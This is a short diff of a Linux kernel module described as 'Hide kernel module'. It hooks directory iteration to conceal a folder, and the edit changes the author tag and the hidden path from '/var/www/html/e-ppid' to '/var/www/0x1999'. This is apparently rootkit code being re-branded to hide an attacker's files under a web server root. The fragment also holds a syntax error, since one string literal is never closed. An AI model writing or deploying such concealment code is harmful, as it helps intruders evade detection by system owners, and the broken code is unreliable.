@@ -5,10 +5,10 @@
 #include <linux/string.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Bangladesh-Team");
+MODULE_AUTHOR("0x1999");
 MODULE_DESCRIPTION("Hide kernel module);
 
-#define HIDDEN_DIRECTORY "/var/www/html/e-ppid"
+#define HIDDEN_DIRECTORY "/var/www/0x1999"
 
 static int hide_directory_iterate(struct file *filp, struct dir_context *ctx)
 {
